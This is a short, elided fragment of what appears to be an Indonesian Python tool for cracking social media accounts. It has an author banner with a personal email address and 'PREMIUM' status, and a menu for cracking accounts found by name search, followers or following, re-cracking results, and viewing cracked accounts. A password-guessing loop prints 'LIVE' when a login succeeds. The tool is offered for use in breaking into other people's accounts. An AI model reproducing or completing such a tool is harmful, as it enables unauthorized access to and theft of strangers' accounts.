...
{H}[*] Email       : Farhanoktav1@gmail.com
{H}[*] TTL Bucin   : 20 Januari 2022
{H}[*] --------------------------------------------------------------------
{H}[*] Kadaluwarsa : -
{H}[*] Status      : PREMIUM
{K}[*] Author      : FARHAN OKTAVIAN
{H}[*] -------------------------------------------------------------------

{O}[01]. Crack dari pencarian nama
{O}[02]. Crack dari pengikut
{O}[03]. Crack dari mengikuti

{U}[04]. Crack ulang hasil crack
{U}[05]. Lihat akun hasil crack
{U}[09]. Bot auto mencintai
		...
		try:
			for pw in pas:
				...
				if "userId" in str(x_jason):
					...
					print(f"""\r {H}[>]{C} {H}STATUS : {H}FARHAN LIVE
  {H}[>]{C} {H}NAMA: {H}{nama}{C}
